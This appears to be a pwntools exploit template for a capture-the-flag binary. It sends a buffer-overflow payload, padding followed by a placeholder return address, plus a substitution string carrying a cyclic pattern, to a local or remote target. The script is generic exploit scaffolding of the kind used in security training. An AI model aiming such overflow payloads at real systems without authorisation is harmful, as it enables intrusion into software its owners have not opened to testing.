from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./replaceme"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()
input("attach gdb")
padding = 80

payload = flat(
    b"A" + b"B" * padding,
    p64(0xdeadbeef)
)

# write('payload', payload)

io.sendlineafter(b"t: ", payload)
io.sendlineafter(b"t: ", b"s/A/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab/")

io.interactive()